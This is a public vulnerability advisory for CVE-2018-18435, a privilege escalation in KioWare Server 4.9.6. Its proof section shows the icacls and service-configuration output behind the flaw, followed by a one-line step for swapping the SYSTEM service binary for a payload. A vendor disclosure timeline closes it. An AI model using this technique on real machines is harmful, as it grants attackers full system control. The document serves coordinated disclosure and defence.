@@ -1,0 +1,71 @@
+# Exploit Title      : KioWare Server Version 4.9.6 - Weak Folder Permissions Privilege Escalation
+# Date               : 10/12/2018
+# Exploit Author     : Hashim Jawad - @ihack4falafel
+# Vendor Homepage    : https://www.kioware.com/
+# Tested on          : Windows Server 2016 Standard (x64)
+# CVE                : CVE-2018-18435
+
+Description:
+============
+KioWare Server version 4.9.6 and older installs by default to "C:\kioware_com" with weak folder permissions granting any user full permission "Everyone: (F)" to the contents of the directory and it's sub-folders. In addition, the program installs a service called "KWSService" which runs as "Localsystem", this will allow any user to escalate privileges to "NT AUTHORITY\SYSTEM" by substituting the service's binary with a malicious one.
+
+Proof:
+======
+C:\>icacls c:\kioware_com
+C:\kioware_com Everyone:(OI)(CI)(F)
+               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+               BUILTIN\Administrators:(I)(OI)(CI)(F)
+               BUILTIN\Users:(I)(OI)(CI)(RX)
+               BUILTIN\Users:(I)(CI)(AD)
+               BUILTIN\Users:(I)(CI)(WD)
+               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\>sc qc KWSService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: KWSService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\kioware_com\KWSS.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : KWS Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\>icacls C:\kioware_com\KWSS.exe
+C:\kioware_com\KWSS.exe Everyone:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Users:(I)(RX)
+                        WIN-ONKVVSNUHKV\test:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\>
+
+Exploit:
+========
+Simply replace "KWSS.exe" with your preferred payload and wait for execution upon reboot.
+
+# Disclosure Timeline:
+# ====================
+# 10-13-18: Contacted vendor
+# 10-15-18: Vendor requested full report and POC
+# 10-15-18: Full report and POC sent
+# 10-16-18: Vendor was able to reproduce/validate the issue and filed a feature request
+# 10-16-18: Asked vendor to provide timeline for patch
+# 10-16-18: Requested CVE ID 
+# 10-17-18: CVE-2018-18435 assigned 
+# 10-17-18: Vendor requested 90 days timeline to patch/QA test
+# 12-20-18: Vendor sent patch and requested feedback
+# 12-22-18: Suggestions/modifications sent to Vendor
+# 12-24-18: Vendor sent new patch and requested feedback
+# 12-25-18: New Suggestions/modifications sent to Vendor
+# 12-26-18: Vendor sent new patch and requested feedback
+# 12-27-18: Vendor was notified that the latest patch is sufficient
+# 12-31-18: Vendor released new version (v4.9.9) and patch as well
+# 01-07-19: Vulnerability has been made public
